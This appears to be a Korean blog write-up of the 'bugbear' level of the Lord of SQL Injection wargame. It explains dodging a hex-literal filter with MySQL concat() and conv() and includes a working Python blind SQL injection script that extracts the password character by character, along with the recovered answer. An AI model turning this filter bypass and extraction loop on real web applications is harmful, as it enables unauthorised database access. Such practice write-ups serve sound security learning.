---
layout: post
title: LOS Bugbear 
date: 2015-10-22 18:32:00 +0900
category: Hacking
---
dark_knight는 0x가 먹혀서 hex로 우회 했지만 이건 다막았다. 

이걸 당시에 풀떄는 엄청나게 삽질을 했었는데 결국 찾아낸 방법은 

문자를 하나하나 진법 변환하여 붙이는 방법이었다. 

concat()은 문자를 합쳐서 문자열을 만들어 주는 함수 이고



conv()는 진법을 변환해주는 함수다





conv(초기값, 초기진수, 변환진수)이거다



10,10,36이라면



10진수 10을 36진수로 바꾸면 A

13진수 10을 36진수로 바꾸면 D 



이런식으로 admin을 문자를 만든후 합쳐주면 된다.




```
import requests
 
 
 
site=""
key=""
header={'Cookie':'PHPSESSID='}
for j in range(1,9):
        for i in range(0,36):
                
                site="http://los.sandbox.cash/chall/bugbear_b5bab623f7cba12e66b27364bedb710b.php?no=1||id/**/in/**/(CONCAT(conv(10,10,36),conv(10,13,36),conv(10,22,36),conv(10,18,36),conv(10,23,36)))%26%26if"
                site+="(mid(pw,"+str(j)+",1)in(conv("+str(i)+",10,36)),1,0)"
                
                print (site)
 
               
                r=requests.put(site,headers=header)
 
                
                if "h2>Hello admin</h2" in r.text:
                  key+="conv("+str(i)+",10,36),"
                  print ("key : %s "%key)
                  break;
```
결과값은 이렇게 나온다



이제 mysql에서 돌려서 확인해보면 된다.



conv(5,10,36),conv(2,10,36),conv(13,10,36),conv(12,10,36),conv(3,10,36),conv(9,10,36),conv(9,10,36),conv(1,10,36),



```
http://los.sandbox.cash/chall/bugbear_b5bab623f7cba12e66b27364bedb710b.php?pw=52dc3991
```





소문자로 바꿔서 해주면 된다. 



출처 : http://unknown84.tistory.com/17











